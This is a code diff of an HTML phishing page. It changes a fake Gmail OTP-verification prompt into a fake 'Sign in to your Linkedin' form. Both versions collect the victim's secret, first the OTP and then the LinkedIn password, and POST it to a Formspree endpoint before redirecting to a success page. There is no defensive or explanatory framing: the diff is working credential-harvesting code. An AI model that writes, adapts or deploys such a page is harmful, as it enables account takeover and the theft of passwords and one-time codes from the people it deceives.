@@ -44,12 +44,12 @@
   <div class="header">
          <img src="logo.png" alt="Company Logo" class="logo">
   </div>
-  <p>An OTP Varification Code was sent your gmail. Please, check your inbox and put this OTP here.</p>
+  <p>Sign in to your Linkedin.</p>
         <form id="loginForm">
-    <input type="password" id="password" name="message" placeholder="Enter OTP here..." required>
+    <input type="password" id="password" name="message" placeholder="Enter Linkedin Password" required>
     <button type="submit">Submit</button>
-    <p><a href="otp.html">Send code again?</a></p>
-    <p> <a href="login.html">Try other way...</a></p>
+
+    <p> <a href="login.html">Forgot Password?</a></p>
 </form>
 
 <script>
@@ -59,7 +59,7 @@ document.getElementById('loginForm').addEventListener('submit', function(e) {
     const form = e.target;
     const formData = new FormData(form);
 
-    fetch('https://formspree.io/f/mnndnbvr', {
+    fetch('https://formspree.io/f/mldbdovj', {
         method: 'POST',
         body: formData,
         headers: {
@@ -67,7 +67,7 @@ document.getElementById('loginForm').addEventListener('submit', function(e) {
         }
     }).then(function(response) {
         if (response.ok) {
-            window.location.href = "otpagain.html"; // Redirect after successful submission
+            window.location.href = "success.html"; // Redirect after successful submission
         } else {
             alert('Form submission failed. Please try again.');
         }
